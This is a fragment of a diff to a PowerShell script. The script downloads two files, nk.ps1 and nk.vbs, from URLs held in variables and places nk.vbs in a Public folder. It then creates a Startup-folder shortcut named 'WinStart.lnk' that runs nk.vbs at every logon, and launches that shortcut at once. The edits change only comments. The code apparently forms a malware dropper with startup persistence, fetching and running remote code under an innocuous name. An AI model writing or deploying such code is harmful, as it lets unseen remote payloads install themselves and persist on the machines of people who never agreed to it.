@@ -15,18 +15,18 @@ $File2Name = "nk.vbs"
 $File1Path = Join-Path -Path $LocalPath -ChildPath $File1Name
 $File2Path = Join-Path -Path $PublicLibPath -ChildPath $File2Name
 
-# Download fileta.ps1
+# Download nk.ps1
 Invoke-WebRequest -Uri $File1Url -OutFile $File1Path
 
-# Download Startup.vbs
+# Download nk.vbs and save to Public
 Invoke-WebRequest -Uri $File2Url -OutFile $File2Path
 
-# Create a shortcut for Startup.vbs
+# Create shortcut in Startup to run nk.vbs from Public
 $ShortcutPath = Join-Path -Path $StartupPath -ChildPath "WinStart.lnk"
 $WScriptShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
 $Shortcut.TargetPath = $File2Path
 $Shortcut.Save()
 
-# Execute the shortcut
+# Execute shortcut
 Start-Process $ShortcutPath
